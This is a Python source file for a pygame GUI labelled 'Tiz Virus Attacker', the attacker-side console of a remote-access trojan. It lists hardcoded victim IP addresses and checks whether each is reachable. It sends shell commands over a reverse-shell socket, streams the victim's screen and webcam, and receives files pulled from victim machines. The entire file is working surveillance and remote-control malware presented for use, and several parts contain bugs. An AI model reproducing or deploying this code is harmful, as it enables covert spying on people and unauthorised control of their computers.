# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""
from __future__ import division
import pygame
import numpy as np
import socket, argparse, sys, threading, os, zlib, cv2, struct

# Initialize Pygame
pygame.init()

# Set up display
WIDTH, HEIGHT = 800, 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Remote Desktop Menu")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GRAY = (200, 200, 200)
DARK_GRAY = (100, 100, 100)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)

# Font
font = pygame.font.Font(None, 36)

# arguments parser
def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
    cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
    options = cli_args.parse_args(sys.argv[1:])
  
    options.hosts = VICTIM_IPS
    return options

class Display:
    def __init__(self, x, y, width, height, text):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text

    def draw(self, surface, offset_y):
        adjusted_rect = self.rect.copy()
        adjusted_rect.y -= offset_y
        if 0 <= adjusted_rect.y < HEIGHT and adjusted_rect.bottom > 0:
            pygame.draw.rect(surface, GRAY, adjusted_rect)
            pygame.draw.rect(surface, DARK_GRAY, adjusted_rect, 2)
            text_surface = font.render(self.text, True, BLACK)
            text_rect = text_surface.get_rect(center=adjusted_rect.center)
            surface.blit(text_surface, text_rect)

class Button:
    def __init__(self, x, y, width, height, text, color):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text
        self.color = color

    def draw(self, surface):
        pygame.draw.rect(surface, self.color, self.rect)
        pygame.draw.rect(surface, DARK_GRAY, self.rect, 2)
        text_surface = font.render(self.text, True, BLACK)
        text_rect = text_surface.get_rect(center=self.rect.center)
        surface.blit(text_surface, text_rect)

import textwrap
class InputBox:
    def __init__(self, x, y, width, height):
        self.rect = pygame.Rect(x, y, width, height)
        self.color = BLACK
        self.text = ''
        self.prompt = 'Enter command: '
        self.active = False
        self.font = pygame.font.Font(None, 20)  # Sử dụng font Arial hỗ trợ Unicode
        self.history = []  # Lưu lịch sử lệnh và kết quả
        self.scroll_offset = 0  # Vị trí cuộn hiện tại
        self.cursor_visible = True  # Con trỏ chuột
        self.cursor_counter = 0  # Để điều khiển nhấp nháy con trỏ

    def handle_event(self, event):
        if event.type == pygame.MOUSEBUTTONDOWN:
            if self.rect.collidepoint(event.pos):
                self.active = not self.active
            else:
                self.active = False
            self.color = GREEN if self.active else GRAY

        if event.type == pygame.KEYDOWN and self.active:
            if event.key == pygame.K_RETURN:
                command = self.text.strip()
                result = self.send_command(command)
                self.history.append(f"$ {command}")
                self.history.append(result)
                self.text = ''
                
                # Tính số dòng thực tế
                total_lines = sum(len(textwrap.wrap(line, width=70)) for line in self.history)
                visible_lines = (self.rect.height - 20) // 20

                # Kiểm tra cuộn
                if total_lines > visible_lines:
                    # Cập nhật scroll_offset để luôn cuộn đúng
                    self.scroll_offset = (total_lines - visible_lines) * 20
                else:
                    self.scroll_offset = 0

            elif event.key == pygame.K_BACKSPACE:
                self.text = self.text[:-1]
            else:
                self.text += event.unicode

        # Điều khiển cuộn chuột
        if event.type == pygame.MOUSEBUTTONDOWN and event.button in (4, 5):
            if event.button == 4:  # Cuộn lên
                self.scroll_offset = max(0, self.scroll_offset - 20)
            elif event.button == 5:  # Cuộn xuống
                total_lines = sum(len(textwrap.wrap(line, width=50)) for line in self.history)
                visible_lines = (self.rect.height - 20) // 20
                max_scroll = max(0, (total_lines - visible_lines) * 20)
                self.scroll_offset = min(max_scroll, self.scroll_offset + 20)



    def draw(self, surface):
        pygame.draw.rect(surface, BLACK, self.rect)

        y_offset = self.rect.y - self.scroll_offset
        for line in self.history:
            wrapped_lines = textwrap.wrap(line, width=50)
            for wrapped_line in wrapped_lines:
                txt_surface = self.font.render(wrapped_line, True, WHITE)
                surface.blit(txt_surface, (self.rect.x + 5, y_offset))
                y_offset += txt_surface.get_height()

        # Vẽ ký tự "$" trước dòng lệnh
        dollar_surface = self.font.render('$ ', True, WHITE)
        surface.blit(dollar_surface, (self.rect.x + 5, y_offset))

        # Vẽ nội dung nhập vào
        txt_surface = self.font.render(self.text, True, WHITE)
        surface.blit(txt_surface, (self.rect.x + 20, y_offset))

        if self.active and self.cursor_visible:
            cursor_x = 20 + txt_surface.get_width()  # Điều chỉnh vị trí con trỏ
            pygame.draw.rect(surface, WHITE, (self.rect.x + cursor_x, y_offset, 2, txt_surface.get_height()))

        self.cursor_counter += 1
        if self.cursor_counter % 60 < 30:
            self.cursor_visible = True
        else:
            self.cursor_visible = False

    def send_command(self, command):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            BUFFER_SIZE = 1024
            s.connect((options.host, options.port))
            
            s.send(command.encode())
            if command.lower() == "exit":
                return "Disconnected."

            results = s.recv(BUFFER_SIZE).decode()
            s.close()
            return results.strip()
        except Exception as e:
            return f"Error when sending command: {e}"

# vector victim origin
VICTIM_IPS = ['192.168.1.3','192.168.1.6', '10.0.2.15']

# check victim status 
def check_victim_status(hosts, port):
    victims_status = {}
    for host in hosts:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)  # Set timeout to 1 second
            s.connect((host, port))
            victims_status[host] = "Reachable"
            s.close()
        except socket.error:
            victims_status[host] = "Not reachable"
    return victims_status

def choose_victim(victims_status):
    print("Victim Status:")
    for i, (host, status) in enumerate(victims_status.items(), 1):
        print(f"{i}. {host} - {status}")
    
    while True:
        choice = input(f"Choose victim to connect (1-{len(victims_status)}): ")
        if choice.isdigit() and 1 <= int(choice) <= len(victims_status):
            selected_host = list(victims_status.keys())[int(choice) - 1]
            # Kiểm tra trạng thái là "Reachable"
            if victims_status[selected_host] == "Reachable":
                return selected_host
            else:
                print(f"Victim {selected_host} is not reachable.")
        else:
            print("Invalid choice, try again.")

# Create initial displays
displays = [
    Display(50, 50, 200, 150, VICTIM_IPS[0]),
    Display(300, 50, 200, 150, VICTIM_IPS[1]),
    Display(550, 50, 200, 150, VICTIM_IPS[2]),
]

# Create "+" button
add_button = Display(WIDTH - 100, HEIGHT - 100, 80, 80, "+")
back_button = Display(10, 10, 100, 50, "Back")

# Camera, Screen, and File thread status
camera_running = False
screen_running = False

# Define the video panel rectangle for screen stream
screen_panel_rect = pygame.Rect(50, 50, 500, 500)  # X, Y, Width, Height

def create_new_display():
    num_displays = len(displays)
    row = num_displays // 3
    col = num_displays % 3
    x = 50 + col * 250
    y = 50 + row * 200
    return Display(x, y, 200, 150, f"Display {num_displays + 1}")

# reverse shell receiver
def R_tcp(selected_host = "192.168.1.3", port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    BUFFER_SIZE = 4096
    s.connect((selected_host, port))
    print(f"Connected to victim at {selected_host}:{port}")
    
    while True:
        command = input("Enter the command you want to execute (or type 'exit' to disconnect): ")
        s.send(command.encode())
        
        if command.lower() == "exit":
            print("Exiting reverse shell...")
            break
        
        results = s.recv(BUFFER_SIZE).decode()
        
        if not results:
            print("No output received.")
        else:
            print(results)
    
    s.close()

def recvall(sock, length, buffer_size=8192):
    buf = b''
    while len(buf) < length:
        data = sock.recv(min(buffer_size, length - len(buf)))
        if not data:
            return None
        buf += data
    return buf


def screenreceiver(host='192.168.1.3', port=5001):
    global screen_running
    screen_running = True
    with socket.socket() as sock:
        sock.connect((host, port))
        while screen_running:
            try:
                size_len = sock.recv(1)
                if not size_len:
                    print("Disconnected from server.")
                    break
                
                size_len = int.from_bytes(size_len, byteorder='big')
                size = int.from_bytes(sock.recv(size_len), byteorder='big')

                print(f"Receiving frame size: {size} bytes")

                pixels = recvall(sock, size)
                if not pixels:
                    print("Received incomplete frame data.")
                    break

                try:
                    pixels = zlib.decompress(pixels)
                except zlib.error as e:
                    print(f"Error decompressing: {e}")
                    continue

                print(f"Decompressed frame size: {len(pixels)} bytes")

                img = pygame.image.fromstring(pixels, (500, 500), 'RGB')
                screen.blit(img, screen_panel_rect.topleft)
                pygame.display.flip() 
                pygame.display.update([screen_panel_rect])
                pygame.time.delay(30)

            except Exception as e:
                print(f"Error receiving/displaying image: {e}")
                break

def camreceiver(host='192.168.1.3', port=5002):
    global camera_running
    s = socket.socket()
    s.connect((host, port))
    camera_running = True
    dat = b''
    while camera_running:
        seg = s.recv(500)
        dat += seg
        try:
            img = cv2.imdecode(np.frombuffer(dat, dtype=np.uint8), cv2.IMREAD_COLOR)
            if img is not None:
                cv2.imshow('Camera', img)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    camera_running = False
                    break
        except Exception as e:
            print(f"Error: {e}")
        dat = b''
    camera_running = False
    s.close()
    cv2.destroyAllWindows()

def receive_file(host, port, save_directory='received_files'):
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                try:
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        break

                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    filepath = os.path.join(save_directory, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break


def show_full_screen(display):
    pygame.init()
    font = pygame.font.SysFont(None, 36)
    full_screen = True
    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130)
    camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Camera", GREEN)
    screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Screen", BLUE)
    file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 100, 190, 50, "Receive File", RED)
        
    camera_thread = None
    screen_thread = None

    global camera_running, screen_running

    while full_screen:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            input_box.handle_event(event)  # Xử lý sự kiện cho vùng input

            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    if back_button.rect.collidepoint(event.pos):
                        full_screen = False
                    elif camera_button.rect.collidepoint(event.pos):
                        if not camera_running:
                            camera_thread = threading.Thread(target=camreceiver)
                            camera_thread.start()
                            camera_button.text = "Stop Camera"
                        else:
                            camera_running = False
                            camera_button.text = "Start Camera"
                    elif screen_button.rect.collidepoint(event.pos):
                        if not screen_running:
                            screen_thread = threading.Thread(target=screenreceiver)
                            screen_thread.start()
                            screen_button.text = "Stop Screen"
                        else:
                            screen_running = False
                            screen_button.text = "Start Screen"
                    elif file_button.rect.collidepoint(event.pos):               
                        file_thread = threading.Thread(target=receive_file, args=("0.0.0.0", options.port + 3))  # Port 5003
                        file_thread.start()

        screen.fill(WHITE)
        input_box.draw(screen)
        text_surface = font.render(f"Full Screen: {display.text}", True, BLACK)
        text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
        screen.blit(text_surface, text_rect)
              
        camera_button.draw(screen)
        screen_button.draw(screen)
        file_button.draw(screen)
        back_button.draw(screen, 0)
        
        pygame.display.flip()

    if screen_thread:
        screen_running = False
        screen_thread.join()


def main():
    global options
    options = parseargs()
    clock = pygame.time.Clock()
    scroll_y = 0
    max_scroll_y = 0

    while True:
        

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1:
                    for display in displays:
                        if display.rect.collidepoint(event.pos[0], event.pos[1] + scroll_y):
                            show_full_screen(display)
                    if add_button.rect.collidepoint(event.pos):
                        new_display = create_new_display()
                        displays.append(new_display)
                        max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)
                elif event.button == 4:  
                    scroll_y = max(0, scroll_y - 20)
                elif event.button == 5:  
                    scroll_y = min(max_scroll_y, scroll_y + 20)

        screen.fill(WHITE)

        for display in displays:
            display.draw(screen, scroll_y)

        add_button.draw(screen, 0)

        victims_status = check_victim_status(options.hosts, options.port)
        # xử lí hiện tích xanh trên giao diện display nếu trạng thái có thể kết nối và tích đỏ nếu máy ảo ko hd
        for i in range(len(victims_status)):  
            if victims_status.get(i) == "Reachable":
                onl_button = Display((i % 3) * 250 + 50, (i // 3) * 250 + 50, 2, 2, "", GREEN)
                onl_button.draw(screen,scroll_y)
            else:
                onl_button = Display((i % 3) * 250 + 50, (i // 3) * 250 + 50, 2, 2, "", RED)
                onl_button.draw(screen,scroll_y)


        pygame.display.flip()
        clock.tick(60)

if __name__ == "__main__":
    main()
